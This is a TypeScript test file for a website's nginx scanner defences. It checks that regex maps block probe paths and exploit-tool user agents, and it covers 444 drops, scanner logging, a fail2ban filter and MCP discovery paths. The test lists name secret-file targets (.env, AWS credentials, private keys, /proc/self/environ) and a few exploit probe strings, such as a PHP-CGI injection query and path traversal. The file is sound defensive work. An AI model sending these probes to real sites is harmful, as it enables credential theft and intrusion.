import { existsSync, readdirSync, readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { describe, expect, it } from 'vitest';

const root = resolve(__dirname, '..', '..');
const conf = readFileSync(resolve(root, 'nginx.conf'), 'utf8');
// The apex HTTPS server block (the first one): the others only redirect to it. Tests of locations and
// error_page search this slice, so a rule moved into another server block no longer passes.
const apexStart = conf.indexOf('\nserver {');
const apex = conf.slice(apexStart, conf.indexOf('\n}\n', apexStart) + 3);

function mapPatterns(mapHeader: string): RegExp[] {
  const start = conf.indexOf(mapHeader);
  expect(start).toBeGreaterThan(-1);
  const body = conf.slice(start, conf.indexOf('\n}', start));
  const patterns = [...body.matchAll(/^\s*"~\*(.+)" 1;$|^\s*~\*(.+) 1;$/gm)].map(
    (match) => new RegExp(match[1] ?? match[2] ?? '', 'i'),
  );
  // Every regex key in the map must have been parsed, so none is silently left untested.
  const regexKeys = body.split('\n').filter((line) => /^\s*"?~\*/.test(line));
  expect(patterns).toHaveLength(regexKeys.length);
  return patterns;
}

const pathPatterns = mapPatterns('map $request_uri $scanner_path {');
const agentPatterns = mapPatterns('map $http_user_agent $scanner_agent {');

const isScannerPath = (uri: string): boolean => pathPatterns.some((pattern) => pattern.test(uri));
const isScannerAgent = (agent: string): boolean => agentPatterns.some((pattern) => pattern.test(agent));

describe('nginx scanner defense', () => {
  it('parses every scanner pattern from nginx.conf', () => {
    expect(pathPatterns.length).toBeGreaterThan(10);
    expect(agentPatterns).toHaveLength(1);
  });

  it.each([
    '/autodiscover/autodiscover.xml',
    '/ews/exchange.asmx',
    '/EWS/Services.asmx?x=1',
    '/ews/exchange.asmx?x=1',
    '/ews/services.asmx',
    '/Autodiscover/Autodiscover.json?@x.com/owa/',
    '/autodiscover/autodiscover.json/v1.0/a@b.c?Protocol=Autodiscoverv1',
    '/.env',
    '/.env.production',
    '/.env-example',
    '/old/.env',
    '/.git/config',
    '/.aws/credentials',
    '/.config/gcloud/credentials.db',
    '/.htaccess',
    '/%2ehtaccess?v=ToOdG',
    '/%252eenv%252eold',
    '/%63%6f%6e%66%69%67.%70%68%70?v=NuoMS',
    '/wp-login.php',
    '/backup.gz',
    '/old/sitemap.gz',
    '/sitemap.gz.bak',
    '/sitemap.gz.gz',
    '/sitemap.gz/x.gz',
    '/wp-admin/admin-ajax.php',
    '/wordpress/wp-config.php.txt',
    '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    '/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input',
    '/OA_HTML/AppsTCFServer',
    '/actuator/health',
    '/_profiler/phpinfo',
    '/config/aws.json',
    '/config.json',
    '/appsettings.json',
    '/application-prod.yml',
    '/serviceAccount.json',
    '/aws/credentials.env',
    '/aws-exports.json.env',
    '/assets/env.js',
    '/composer.lock',
    '/sftp-config.json',
    '/old/sftp-config.json?v=1',
    '/terraform.tfstate',
    '/terraform.tfstate.backup',
    '/terraform.tfvars',
    '/latest/meta-data/iam/security-credentials',
    '/api/v1/%2eenv?v=MEnS9',
    '/storage/logs/laravel.log',
    '/docker-compose.prod.yml',
    '/docker-compose.yaml',
    '/Dockerfile',
    '/Dockerfile.prod',
    '/.dockerignore',
    '/readme.html',
    '/license.txt',
    '/account/create',
    '/account/register',
    '/auth/signup',
    '/create-account',
    '/email-signup',
    '/footer-signup',
    '/contact-form',
    '/company',
    '/leistungen',
    '/our-team',
    '/products',
    '/services',
    '/servicios',
    '/team',
    '/vpn',
    '/services/',
    '/team?ref=1',
    '/api/usage/stats',
    '/v1/auth/me',
    '/auth/register',
    '/api/usage/stats?x=1',
    '/api/usage/stats/',
    '/v1/auth/me?x=1',
    '/v1/auth/login',
    '/v1/auth/token/refresh',
    '/v1/auth/oauth2',
    '/crumbIssuer/api/json',
    '/crumbIssuer',
    '/run',
    '/RUN/',
    '/health',
    '/version?x=1',
    '/health/',
    '/version/',
    '/crumbIssuer?x=1',
    '/run?x',
    '/code/blocks/exec/code',
    '/code/blocks/exec/start',
    '/api/v1/code/blocks/exec/code',
    '/api/v1/code/blocks/exec/start',
    '/Team',
    '/ACCOUNT/Create',
    '/users/sign_in',
    '/users/sign_in/',
    '/users/sign_in?next=/',
    '/Users/Sign_In',
    '/users/sign_up',
    '/api/sonicos/is-sslvpn-enabled',
    '/api/sonicos/auth',
    '/sonicos/auth',
    '/sonicui/7/sslvpn-portal',
    '/sonicui/7/sslvpn-portal/',
    '/sslvpnLogin.html',
    '/auth.html',
    '/auth1.html',
    '/Auth.html?x=1',
    '/WebInterface',
    '/WebInterface/login.html',
    '/wp',
    '/wp/',
    '/health/liveliness',
    '/health/readiness',
    '/health/liveliness?probe=1',
    '/wallet/topup/9985',
    '/wallet',
    '/wallet/',
    '/build/manifest.json',
    '/ipfs/bafkreicyqcbhpicbos7ev4mrxofwqx6hvvge7pahpta6xuspr44crai5by',
    '/ipfs/',
    '/ipfs',
    '/Wallet/topup/1',
    '/wallet?x=1',
    '/build/manifest.json?v=1',
    '/ipfs/bafy?filename=x',
    '/+CSCOE+/logon.html',
    '/+CSCOT+/oem-customization?app=AnyConnect&type=oem',
    '/+cscoe+/logon.html',
    '/eventmanager',
    '/eventmanager/',
    '/eventmanager?x=1',
    '/EventManager',
    '/server-status',
    '/server-status/',
    '/server-info',
    '/debug/vars',
    '/solr',
    '/solr/',
    '/solr/admin/info/system',
    '/solr/admin/cores?action=STATUS&wt=json',
    '/media/com_acym/css/global.min.css',
    '/components/com_users/assets/x.js',
    '/old/media/com_x/y.css',
    '/flowise.sqlite',
    '/data/app.sqlite3',
    '/data/app.db',
    '/node/1.json',
    '/node/12',
    '/node/1.json?x=1',
    '/core/modules/system',
    '/core/modules/system/',
    '/user/login',
    '/user/login/',
    '/User/Login?next=/',
    '/pub/static',
    '/pub/static/',
    '/pub/static/frontend/Magento/luma/en_US/requirejs/require.js',
    '/actions/users/session-info',
    '/actions/users/session-info?x=1',
    '/actions/users',
    '/actions/users?x=1',
    '/pub/static?x=1',
    '/language/en-GB/en-GB.xml',
    '/language/de-DE/install.xml?x=1',
    '/Language/en-gb/en-GB.xml',
    // Rails, Django, Jenkins and Expo secrets and build files, swept from one spoofed-Googlebot address
    '/Gemfile.lock',
    '/Gemfile',
    '/Jenkinsfile',
    '/app.json',
    '/config.py',
    '/instance/config.py',
    '/credentials.py',
    '/secrets.py',
    '/local.py',
    '/local_settings.py',
    '/database.yml',
    '/yarn.lock',
    '/config/credentials.yml.enc',
    '/config/environment.rb',
    '/config/master.key',
    '/app/config/master.key?x=1',
    '/env',
    '/env.txt',
    '/env?x=1',
    // Microsoft Remote Desktop Web Access and the Metabase pre-auth setup-token probe
    '/RDWeb',
    '/RDWeb/Pages',
    '/rdweb/pages/en-US/login.aspx',
    '/api/session/properties',
    '/api/session/properties/',
    '/api/session/properties?x=1',
    // Daily 404 report of 13 November 2026: framework debug probes, a secret and key-file sweep, Nmap, DoH and DevTools probes
    '/GoogleService-Info.plist',
    '/Vagrantfile',
    '/_debugbar/open',
    '/_ignition/health-check',
    '/debug/default/toolbar',
    '/telescope/requests',
    '/elmah.axd',
    '/trace.axd',
    '/app/etc/local.xml',
    '/ssmtp.conf',
    '/error_log',
    '/key.pem',
    '/private.key',
    '/privkey.pem',
    '/server.key',
    '/id_rsa',
    '/id_ed25519.pub',
    '/api-keys.txt',
    '/tokens.txt',
    '/credentials.csv',
    '/aws.yml',
    '/aws.json',
    '/auth.json',
    '/env.json',
    '/now.json',
    '/s3.json',
    '/parameters.json',
    '/runtimeconfig.json',
    '/firebase.json',
    '/firebase-adminsdk.json',
    '/gcp-key.json',
    '/google-services.json',
    '/client_secret.json',
    '/serviceAccountKey.json',
    '/application_default_credentials.json',
    '/config/email.yml',
    '/config/mongoid.yml',
    '/config/initializers/secret_token.rb',
    '/metrics',
    '/nginx_status',
    '/json/version',
    '/HNAP1',
    '/nmaplowercheck1794530687',
    '/evox/about',
    '/dns-query',
    '/dns-query?dns=OxQBAAABAAAAAAAAA2RvaAhvdmVyc2VhcwMxNjcCOTkCNTMCOTAIMjAyNjExMTIEdGVzdAl3aGl0ZWNodW4Ec2hvcAAAAQAB',
    '/doh',
    '/doh?dns=YRsBAAABAAAAAAAAA2RvaAhvdmVyc2VhcwMxNjcCOTkCNTMCOTAIMjAyNjExMTIEdGVzdAl3aGl0ZWNodW4Ec2hvcAAAAQAB',
    '/resolve',
    '/resolve?dns=YAsBAAABAAAAAAAAA2RvaAhvdmVyc2VhcwMxNjcCOTkCNTMCOTAIMjAyNjExMTIEdGVzdAl3aGl0ZWNodW4Ec2hvcAAAAQAB',
    '/login',
    '/login/',
    '/login?next=/',
    '/Login',
    '/status',
    '/status?x=1',
    '/remote/login',
    '/remote/login?lang=en',
    '/cp/login',
    '/cp/login/',
    '/CP/Login?x=1',
    '/sdk/vimServiceVersions.xml',
    '/mics/api/v2/sentry/mics-config/handleMessage',
    '/?rest_route=/batch/v1',
    '/?a=1&rest_route=/wp/v2/users',
    // The patterns are case-insensitive
    '/LOGIN',
    '/Remote/Login',
    '/status/',
    '/remote/login/',
    '/SDK/vimserviceversions.xml',
    '/sdk/vimServiceVersions.xml?x=1',
    '/MICS/API/v2/sentry',
    '/?REST_ROUTE=/batch/v1',
    // Daily 404 report of 15 November 2026: a script-library sweep asked for CKEditor.
    '/js/lib/ckeditor/ckeditor.js',
    '/ckeditor/',
    '/CKEditor/ckeditor.js?v=1',
    '/ckeditor.js',
    // Daily 404 report of 18 November 2026: a Django manage.py guess and a Vertex/Firebase credentials-file sweep.
    '/manage.py',
    '/static../manage.py',
    '/app/manage.py?x=1',
    '/config.example.json',
    '/config.sample.json',
    '/config.dist.yml',
    '/iam.json',
    '/IAM.json',
    // Daily 404 report of 24 November 2026: a Python source-file guess (also asked for as /LLM_backup/constants.py).
    '/constants.py',
    '/LLM_backup/constants.py',
    '/constants.py?x=1',
    // Daily 404 report of 19 November 2026: a VICIdial call-centre dialer sweep.
    '/vicidial',
    '/vicidial/admin.php',
    '/agc',
    '/agc/vicidial.php?x=1',
    '/RECORDINGS',
    '/RECORDINGS/MP3',
    // Daily 404 report of 20 November 2026: appliance, CMS and login-page sweeps.
    '/zabbix/favicon.ico',
    '/zabbix',
    '/webfig',
    '/webfig/',
    '/webclient',
    '/console',
    '/console/',
    '/sugar_version.json',
    '/static/historypage.js',
    '/js/NewWindow_2_all.js',
    '/ssi.cgi/Login.htm',
    '/showLogin.cc',
    '/login.do',
    '/sitecore/shell/sitecore.version.xml',
    '/partymgr/control/main',
    '/jasperserver/login.html',
    '/jasperserver-pro/login.html',
    '/jasperserverTest/login.html',
    '/global-protect/login.esp',
    '/internal_forms_authentication',
    '/identity',
    '/identity/jsLibs/IdmBrandingBar.js',
    '/Web/Auth',
    '/api/hyper.Index/config',
    '/hall/api/hyper.Index/config',
    '/api/hyper.Index/config/',
    '/api/hyper.Index/config?x=1',
    '/ssi.cgi',
    '/ssi.cgi?x=1',
    '/a/ssi.cgi/Login.htm',
    '/zabbix?x=1',
    '/identity?x=1',
    '/console?x=1',
    '/login.do?x=1',
    '/Web/Auth/',
    '/ZABBIX/',
    '/Hyper.index/config',
    '/@fs/proc/self/environ?raw??',
    '/_nuxt/@fs/proc/self/environ?raw??',
    '/@vite/client',
    '/_nuxt/@vite/client',
    '/app/@vite/client',
    '/@id/__vite-browser-external:path',
    '/userfiles/x?path=../../.env',
    '/userfiles/x?path=../../../.env',
    '/userfiles',
    '/backup',
    '/backups/',
    '/backup?x=1',
    '/v1/users',
    '/v1/users/',
    '/v1/users?x=1',
    '/@FS/etc/passwd',
    '/userfiles?path=../../.env',
    '/userfiles/',
    '/backups',
    '/backup/',
    '/backups?x=1',
    '/wallet.dat',
    '/Wallet.dat',
    '/wallet.dat?x=1',
    '/old/wallet.dat',
    '/Public/home/js/check.js',
    '/static/admin/javascript/hetong.js',
    '/Public/home/js',
    '/session?aimGetProp=fwVersion',
    '/session?a=1&aimGetProp=fwVersion',
    '/api/v1/repos/search?limit=1',
    '/api/v1/repos',
    '/api/get-logo-setting',
    '/api/get-logo-setting?x=1',
    '/api/v1/repos/',
    '/WALLET.DAT',
    '/public/home/js/check.js',
    '/static/admin/javascript',
    '/static/admin/javascript?x=1',
  ])('flags %s as a scanner path', (uri) => {
    expect(isScannerPath(uri)).toBe(true);
  });

  it.each([
    '/',
    '/law/123',
    '/law/terraform.tfstate-tips',
    '/browse?q=terraform.tfstate',
    '/category/murphys-computer-laws',
    '/examples',
    '/contact',
    '/admin',
    '/api/v1/laws?limit=5&q=%E2%9C%93',
    '/browse?q=env',
    '/browse?q=a%20b%20c',
    '/browse?q=error.log',
    '/browse?q=backup.zip',
    '/search?q=.env',
    '/browse?q=a/.hidden',
    '/browse?page=2&sort=config.json',
    '/browse?q=manage.py',
    '/law/manage.py-tips',
    '/browse?q=constants.py',
    '/law/constants.py-tips',
    '/constants',
    '/browse?q=config.example.json',
    '/law/iam.json',
    '/law/vicidial-tips',
    '/browse?q=recordings',
    '/recordings-tips',
    '/agcx',
    '/api/v1/iam.json',
    '/search?q=wp-login',
    '/calculator/sods-law',
    '/origin-story',
    '/sitemap.xml',
    '/robots.txt',
    '/llms.txt',
    '/openapi.json',
    '/manifest.webmanifest',
    '/apple-touch-icon.png',
    '/assets/index-1a2b3c.js',
    '/.well-known/acme-challenge/abc123',
    '/.well-known/traffic-advice',
    '/.well-known/tdmrep.json',
    '/img/Murphys-law-book.gif',
    '/img/10001844.gif',
    '/contact-us',
    '/about-us',
    '/privacy-policy',
    '/privacy-policy.html',
    '/terms-of-service',
    '/terms-of-service.html',
    '/murphy',
    '/murphy/',
    '/murphy/murphy-golf.html',
    '/murphy/murphy-EMT.htm',
    '/murphy/murphy-laws.html/',
    '/murphy/murphy-laws.html%20',
    '/murphy/murphy-true.html:D',
    '/murphy/murphy-true.htmlkd',
    '/murphy/links.html',
    '/murphy/murphy-',
    '/team/x',
    '/services/seo',
    '/law/team',
    '/category/team',
    '/api/v1/auth/login',
    '/api/health',
    '/browse?q=run',
    '/browse?q=health',
    '/law/run',
    '/api/v1/laws?q=version',
    '/running',
    '/runtime',
    '/healthz',
    '/versions',
    '/api/version',
    '/.well-known/security.txt',
    '/browse?q=team',
    '/browse?q=services',
    // Names next to the new scanner rules that must stay reachable, and queries that merely mention them
    '/ads.txt',
    '/app-ads.txt',
    '/autodiscover',
    '/browse?q=autodiscover/autodiscover.xml',
    '/news/exchange.asmx',
    '/xautodiscover/autodiscover.xml',
    '/autodiscover/autodiscover.xmlx',
    '/ews/exchange.asmxfoo',
    '/api/session',
    '/api/session/propertiesx',
    '/environment',
    '/envelope',
    '/env-notes',
    '/envcheck-8fd5d32d5a7b.html',
    '/browse?q=config.py',
    '/browse?q=Gemfile.lock',
    '/browse?q=app.json',
    '/browse?q=env.txt',
    '/browse?q=config/master.key',
    '/search?q=RDWeb',
    '/search?q=api/session/properties',
    '/law/config',
    '/category/murphys-laws-of-the-environment',
    '/search?q=account/create',
    '/category/murphys-laws-of-team-work',
    '/api/v1/laws?q=vpn',
    '/browse?q=readme.html',
    '/browse?q=docker-compose.yml',
    '/users',
    '/law/users',
    '/browse?q=users/sign_in',
    '/users/sign_in_help',
    '/users/sign_up/extra',
    '/user/sign_in',
    '/murphy',
    '/img/pvtmurphy.gif',
    '/sitemaps.xml',
    '/sitemap.gz',
    '/sitemap.gz?x=1',
    '/sitemap.gz/',
    '/favicon.png',
    '/browse?q=wp',
    '/browse?q=sonicos',
    '/browse?q=sslvpn-portal',
    '/search?q=auth.html',
    '/law/auth.html',
    '/law/sonicui-tips',
    '/law/cp/login',
    '/cp',
    '/cp/logins',
    '/auth',
    '/auth2.html',
    '/search?q=WebInterface',
    '/wpa',
    '/healthcheck',
    '/law/health',
    '/browse?q=health/liveliness',
    '/browse?q=wallet',
    '/search?q=build/manifest.json',
    '/browse?q=ipfs',
    '/law/wallet',
    '/wallets',
    '/build',
    '/security.txt',
    '/apple-touch-icon-240x240.png',
    '/apple-touch-icon-240x240-precomposed.png',
    '/favicon-512x512.png',
    '/sitemap_index.xml',
    '/sitemap-index.xml',
    '/eventmanager/x',
    '/law/eventmanager',
    '/browse?q=eventmanager',
    '/browse?q=%2BCSCOE%2B',
    '/browse?q=+CSCOE+/logon.html',
    '/solr-search',
    '/solrs',
    '/law/solr',
    '/browse?q=solr/admin',
    '/server-statuses',
    '/search?q=server-status',
    '/debug',
    '/debug/variables',
    '/media',
    '/media/community',
    '/components',
    '/browse?q=media/com_x',
    '/browse?q=flowise.sqlite',
    '/search?q=app.db',
    '/node',
    '/node/abc',
    '/nodes/1',
    '/law/node',
    '/core',
    '/search?q=core/modules/',
    '/user',
    '/user/logins',
    '/law/user/login',
    '/browse?q=user/login',
    '/pub',
    '/pub/staticky',
    '/browse?q=pub/static',
    '/actions',
    '/actions/user',
    '/actions/users-guide',
    '/browse?q=actions/users/session-info',
    '/language',
    '/language/en-GB',
    '/language/en-GB/en-GB.json',
    '/language/en-GB/page?file=a.xml',
    '/node/12abc',
    '/core/modules',
    '/browse?q=language/en-GB/en-GB.xml',
    '/law/language',
    '/law/ckeditor-tips',
    '/browse?q=ckeditor',
    '/ckeditors',
    '/js/lib/ckeditorish.js',
    // Daily 404 report of 13 November 2026. Good-faith crawlers and our own deploy smoke test must still get a real
    // 404, not a 444: AgentDrivesAgent asks for these, and scripts/smoke-production.mjs expects a 404 for the first.
    '/definitely-not-a-real-page',
    '/auth.md',
    '/SKILL.md',
    '/mcp',
    '/mcp.json',
    '/signup',
    '/sign-up',
    '/register',
    '/join',
    '/pricing',
    '/subscription',
    '/subscription/confirm?token=abc',
    '/.well-known/agent-card.json',
    '/.well-known/agent.json',
    '/.well-known/agent-skills/index.json',
    '/.well-known/skills/index.json',
    '/.well-known/oauth-protected-resource',
    '/.well-known/oauth-authorization-server',
    '/s44ahuya1z6cs',
    '/write-for-us',
    '/contribute',
    '/law',
    '/law/',
    '/browse',
    '/categories',
    '/submit',
    '/api/v1/laws?limit=1',
    '/api/v1/laws/1719',
    // The new root-anchored names only match as a whole root path, never deeper or inside a query string
    '/api/v1/metrics',
    '/law/metrics',
    '/category/resolve',
    '/browse?q=metrics',
    '/browse?q=dns-query',
    '/browse?q=doh',
    '/search?q=resolve',
    '/search?q=key.pem',
    '/search?q=Vagrantfile',
    '/search?q=aws.json',
    '/search?q=_debugbar',
    '/browse?q=telescope/requests',
    '/browse?q=elmah.axd',
    '/telescopes',
    '/metrics-guide',
    '/resolved',
    '/dohs',
    '/auth',
    '/authors',
    '/aws',
    '/keys',
    '/key',
    '/now',
    '/env-notes',
    '/laws/key.pemx',
    // Names next to the login, status, appliance and REST-route rules
    '/Murphy/Murphy-true.html',
    '/api/status',
    '/api/v1/auth/status',
    '/law/status',
    '/law/login',
    '/statuses',
    '/login-help',
    '/remote',
    '/remote/logins',
    '/sdk',
    '/sdk/docs',
    '/mics',
    '/browse?q=login',
    '/browse?q=status',
    '/search?q=remote/login',
    '/search?q=sdk/vimServiceVersions.xml',
    '/browse?rest_route=x',
    '/?utm=rest_route',
    '/?utm=a&x=rest_route',
    '/mics/api',
    '/mics/apix',
    '/login;jsessionid=x',
    // The 20 November 2026 patterns match whole names only: longer names, subpages and query strings are real traffic.
    '/identity-theft',
    '/law/identity',
    '/category/console',
    '/browse?q=console',
    '/search?q=webfig',
    '/search?q=ssi.cgi',
    '/consoles',
    '/webclients',
    '/zabbixes',
    '/law/zabbix',
    '/api/v1/laws?q=hyper.Index/config',
    '/console/foo',
    '/webfig/x',
    '/Web/Authors',
    '/login.dos',
    '/sugar_version.jsonx',
    '/static/historypage.js.map',
    '/sitecore-news',
    '/global-protect-tips',
    '/partymgrs',
    '/myssi.cgi/x',
    '/ssi.cgix',
    '/hyper.Indexes/config',
    '/api/hyper.Index/configs',
    '/xhyper.Index/config',
    '/api/hyperXIndex/config',
    // The 21 November 2026 patterns: real routes, searches and the real API stay open.
    '/search?q=@fs/x',
    '/browse?q=a/@vite/client',
    '/law/user@fs/x',
    '/@fsx/',
    '/@viteclient',
    '/browse?q=backup',
    '/backup/restore',
    '/backupsx',
    '/v1/users/123',
    '/law/backup',
    '/backup-tips',
    '/userfilesx',
    '/browse?q=wallet.dat',
    '/law/wallet-dat',
    '/static',
    '/law/static/admin/javascript/x.js',
    '/search?q=Public/home/js',
    '/session',
    '/browse?q=aimGetProp',
    '/api/v1/repository',
    '/api/v1/laws?q=repos',
    '/api/health',
    '/mywallet.dat',
    '/Public/home/jsx',
    '/static/admin/javascripts',
    '/session?xaimGetProp=1',
    '/session?aimGetProp',
    '/api/get-logo-settings',
    '/api/v1/repos-x',
    '/law/userfiles',
    '/search?q=userfiles',
    '/api/v1/users',
    '/api/v1/laws?limit=3&offset=0&sort=last_voted_at&order=desc',
    '/v1/usersx',
    '/swagger.json',
    '/openapi.json',
    '/index.htm',
    '/Murphy/Murphy-true.html',
  ])('lets %s through', (uri) => {
    expect(isScannerPath(uri)).toBe(false);
  });

  it('flags exploit-kit user agents only', () => {
    expect(isScannerAgent('libredtail-http')).toBe(true);
    expect(isScannerAgent('sqlmap/1.7')).toBe(true);
    expect(isScannerAgent('rawgrab')).toBe(true);
    expect(isScannerAgent('wp2shell-rce/1.0')).toBe(true);
    expect(isScannerAgent('WP2Shell-RCE/1.0')).toBe(true);
    expect(isScannerAgent('Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)')).toBe(true);
    expect(isScannerAgent('Fuzz Faster U Fool v2.1.0')).toBe(true);
    expect(isScannerAgent('Mozilla/5.0 (compatible; pathscan/1.0)')).toBe(true);
    expect(isScannerAgent('Pathscan/1.0')).toBe(true);
    expect(isScannerAgent('FUZZ FASTER U FOOL v2.1.0')).toBe(true);
    // Each new name needs its whole text: a part of it, or the words run together, is not the tool
    expect(isScannerAgent('Fuzz Faster')).toBe(false);
    expect(isScannerAgent('fuzzfasterufool')).toBe(false);
    expect(isScannerAgent('pathfinder/1.0')).toBe(false);
    // Ordinary browsers, our own checks (node fetch in the deploy smoke test, curl in the health check) and good-faith bots pass
    expect(isScannerAgent('Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/)')).toBe(false);
    expect(isScannerAgent('python-httpx/0.28.1')).toBe(false);
    expect(isScannerAgent('Python-urllib/3.12')).toBe(false);
    expect(isScannerAgent('Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36')).toBe(false);
    expect(isScannerAgent('node')).toBe(false);
    expect(isScannerAgent('curl/8.4.0')).toBe(false);
    expect(isScannerAgent('AgentDrivesAgent/1.0 (+https://agent.agentdrives.com/bot)')).toBe(false);
    expect(isScannerAgent('Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)')).toBe(false);
    expect(isScannerAgent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15')).toBe(false);
    expect(isScannerAgent('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')).toBe(false);
  });

  it('applies the same drop and log split in all three server blocks', () => {
    expect(conf.match(/if \(\$block_request\) \{\s+return 444;\s+\}/g)).toHaveLength(3);
    expect(conf.match(/access_log \/var\/log\/nginx\/scanner\.log combined if=\$block_request;/g)).toHaveLength(3);
    expect(conf.match(/access_log \/var\/log\/nginx\/access\.log combined if=\$log_normal;/g)).toHaveLength(3);
  });

  it('drops blocked requests with 444 before the trailing-slash rewrite', () => {
    const drop = conf.indexOf('if ($block_request) {');
    expect(drop).toBeGreaterThan(-1);
    expect(conf.slice(drop, conf.indexOf('}', drop))).toContain('return 444;');
    expect(drop).toBeLessThan(conf.indexOf('rewrite ^/(.+)/$ /$1 permanent;'));
  });

  it('keeps blocked hits out of the main access log and in scanner.log', () => {
    const main = conf.slice(conf.indexOf('server_name murphys-laws.com;'));
    expect(main).toContain('access_log /var/log/nginx/access.log combined if=$log_normal;');
    expect(main).toContain('access_log /var/log/nginx/scanner.log combined if=$block_request;');
  });

  it('only blocks when the agent, path and method maps are all clear', () => {
    const start = conf.indexOf('map "$scanner_agent$scanner_path$scanner_post_root" $block_request {');
    expect(start).toBeGreaterThan(-1);
    const block = conf.slice(start, conf.indexOf('\n}', start));
    expect(block).toContain('default 1;');
    expect(block).toContain('"000" 0;');
    // "000" must be the only key that lets a request through.
    expect(block.match(/^\s*"[01]+" 0;$/gm)).toHaveLength(1);
  });

  // No route of the site accepts a POST at "/", so a POST to "/" is always a bot.
  describe('POST to the home page', () => {
    const postRootKeys = (): Set<string | undefined> => {
      const start = conf.indexOf('map "$request_method $request_uri" $scanner_post_root {');
      expect(start).toBeGreaterThan(-1);
      const body = conf.slice(start, conf.indexOf('\n}', start));
      expect(body).toContain('default 0;');
      // nginx map keys without ~ are exact matches.
      return new Set([...body.matchAll(/^\s*"(.+)" 1;$/gm)].map((match) => match[1]));
    };
    // The agent, path and method-and-path maps each give 0 or 1 and are joined into one key; only "000" passes.
    const blocked = (method: string, uri: string, agent = 'Mozilla/5.0'): boolean => {
      const flags = [isScannerAgent(agent), isScannerPath(uri), postRootKeys().has(`${method} ${uri}`)];
      return flags.map((flag) => (flag ? '1' : '0')).join('') !== '000';
    };

    it('is parsed from nginx.conf, with a default of 0 and POST / as the only blocked key', () => {
      expect([...postRootKeys()]).toEqual(['POST /']);
    });

    it('drops a POST to "/", also from a scanner user agent', () => {
      expect(blocked('POST', '/')).toBe(true);
      expect(blocked('POST', '/', 'libredtail-http')).toBe(true);
    });

    it('still drops scanner paths and agents on their own, by any method', () => {
      expect(blocked('GET', '/.env')).toBe(true);
      expect(blocked('POST', '/.env')).toBe(true);
      expect(blocked('GET', '/', 'libredtail-http')).toBe(true);
    });

    it.each([
      ['GET', '/'],
      ['HEAD', '/'],
      ['OPTIONS', '/'],
      ['POST', '/api/v1/laws'],
      ['POST', '/api/v1/laws/1/vote'],
      ['POST', '/subscription/unsubscribe?token=abc'],
      ['POST', '/?utm=x'],
      ['POST', '/law/1'],
    ])('lets %s %s through the whole chain', (method, uri) => {
      expect(blocked(method, uri)).toBe(false);
    });
  });
});

describe('plain HTTP sent to a TLS port', () => {
  // nginx raises error 497 for it and would answer "400 The plain HTTP request was sent to HTTPS port",
  // which shows up in the main access log and the daily report. It is dropped like any scanner hit.
  const dropPlainHttp = new RegExp(
    'error_page 497 =444 @plain_http_on_tls;\\s+' +
      'location @plain_http_on_tls \\{\\s+' +
      'access_log /var/log/nginx/scanner\\.log combined;\\s+' +
      'return 444;\\s+\\}',
  );
  const serverBlocks = conf.split(/^server \{$/m).slice(1);
  const tlsBlocks = serverBlocks.filter((block) => /^\s*listen 443 ssl\b/m.test(block));

  it('drops it, logged to scanner.log only, in every server block that listens for TLS', () => {
    // A new TLS server block that forgets the rule would make this count differ.
    expect(serverBlocks).toHaveLength(3);
    expect(tlsBlocks).toHaveLength(2);
    for (const block of tlsBlocks) {
      expect(block).toMatch(dropPlainHttp);
    }
  });

  it('leaves the plain HTTP server block alone, which redirects instead', () => {
    const plainBlocks = serverBlocks.filter((block) => !tlsBlocks.includes(block));

    expect(plainBlocks).toHaveLength(1);
    expect(plainBlocks[0]).toContain('return 301 https://murphys-laws.com$request_uri;');
    expect(plainBlocks[0]).not.toContain('error_page 497');
  });

  it('writes a 444 line that the fail2ban filter counts as a strike', () => {
    const filter = readFileSync(resolve(root, 'config', 'fail2ban', 'filter.d-nginx-scanner.conf'), 'utf8');
    const failregex = (/^failregex = (.*)$/m.exec(filter)?.[1] ?? '').replace('<HOST>', '(?<host>\\S+)');
    const agent = '"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"';
    const line = (status: number, bytes: number, protocol = 'HTTP/1.1') =>
      `194.187.176.248 - - [07/Nov/2026:01:11:41 +0000] "GET /favicon.ico ${protocol}" ${status} ${bytes} "-" ${agent}`;

    expect(new RegExp(failregex).exec(line(444, 0))?.groups?.host).toBe('194.187.176.248');
    // The 400 that nginx logged before this rule is not counted.
    expect(new RegExp(failregex).test(line(400, 264))).toBe(false);
    // nginx logs the request line of an HTTP/2 stream as HTTP/2.0; that strike counts too.
    expect(new RegExp(failregex).exec(line(444, 0, 'HTTP/2.0'))?.groups?.host).toBe('194.187.176.248');
    expect(new RegExp(failregex).test(line(400, 157, 'HTTP/2.0'))).toBe(false);
  });
});

describe('MCP discovery paths', () => {
  // The MCP server is a local stdio package (mcp/server.json), so nothing is served at /mcp or
  // /.well-known/mcp*, and llms.txt, llms-full.txt and mcp/README.md say so.
  const update =
    'If a hosted MCP endpoint is added, update the stdio-only statements in web/public/llms.txt, web/public/llms-full.txt and mcp/README.md';

  it('has no nginx location for an MCP endpoint or discovery file', () => {
    expect(conf, update).not.toMatch(/^\s*location[^\n{]*mcp/im);
  });

  it('ships no static MCP discovery file', () => {
    const publicDir = resolve(root, 'web', 'public');
    const wellKnown = resolve(publicDir, '.well-known');
    const names = [...readdirSync(publicDir), ...(existsSync(wellKnown) ? readdirSync(wellKnown) : [])];

    expect(
      names.filter((name) => /^mcp/i.test(name)),
      update,
    ).toEqual([]);
  });

  it.each(['web/public/llms.txt', 'web/public/llms-full.txt', 'mcp/README.md'])(
    '%s says the server is stdio-only with no hosted or remote endpoint',
    (file) => {
      const text = readFileSync(resolve(root, file), 'utf8');

      expect(text).toMatch(/stdio/i);
      expect(text).toMatch(/no hosted or remote/i);
    },
  );

  it('keeps the claim in step with mcp/server.json, which declares stdio and the Registry name', () => {
    const server = JSON.parse(readFileSync(resolve(root, 'mcp', 'server.json'), 'utf8')) as {
      name: string;
      packages: Array<{ transport: { type: string } }>;
    };

